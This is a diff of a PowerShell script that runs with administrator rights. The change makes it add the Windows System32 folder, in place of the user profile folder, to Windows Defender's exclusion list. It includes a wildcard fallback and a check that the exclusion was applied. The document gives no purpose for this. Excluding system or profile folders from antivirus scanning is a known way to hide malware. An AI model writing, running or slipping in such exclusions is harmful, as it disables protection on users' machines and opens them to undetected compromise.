@@ -8,33 +8,32 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 try {
-    # Get the user's profile folder path (one folder before AppData)
-    $appDataPath = Split-Path $env:APPDATA -Parent
-    $userProfilePath = Split-Path $appDataPath -Parent
+    # Get the System32 folder path
+    $system32Path = "$env:WINDIR\System32"
     
-    Write-Host "Adding Windows Defender exclusion for: $userProfilePath" -ForegroundColor Yellow
+    Write-Host "Adding Windows Defender exclusion for: $system32Path" -ForegroundColor Yellow
     
-    # Add the user profile folder to Windows Defender exclusions
-    Add-MpPreference -ExclusionPath $userProfilePath
+    # Add the System32 folder to Windows Defender exclusions
+    Add-MpPreference -ExclusionPath $system32Path
     
-    Write-Host "Successfully added user profile exclusion to Windows Defender!" -ForegroundColor Green
-    Write-Host "Excluded path: $userProfilePath" -ForegroundColor Cyan
+    Write-Host "Successfully added System32 exclusion to Windows Defender!" -ForegroundColor Green
+    Write-Host "Excluded path: $system32Path" -ForegroundColor Cyan
     
     # Verify the exclusion was added
     $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
-    if ($exclusions -contains $userProfilePath) {
+    if ($exclusions -contains $system32Path) {
         Write-Host "Exclusion verified successfully!" -ForegroundColor Green
     } else {
         Write-Warning "Could not verify if exclusion was added properly."
     }
     
 } catch {
-    Write-Error "Failed to add user profile exclusion: $($_.Exception.Message)"
+    Write-Error "Failed to add System32 exclusion: $($_.Exception.Message)"
     Write-Host "Attempting to add exclusion with different method..." -ForegroundColor Yellow
     
     try {
         # Alternative method - add exclusion with wildcard
-        Add-MpPreference -ExclusionPath "$userProfilePath\*"
+        Add-MpPreference -ExclusionPath "$system32Path\*"
         Write-Host "Alternative exclusion method applied!" -ForegroundColor Green
     } catch {
         Write-Error "Both exclusion methods failed: $($_.Exception.Message)"
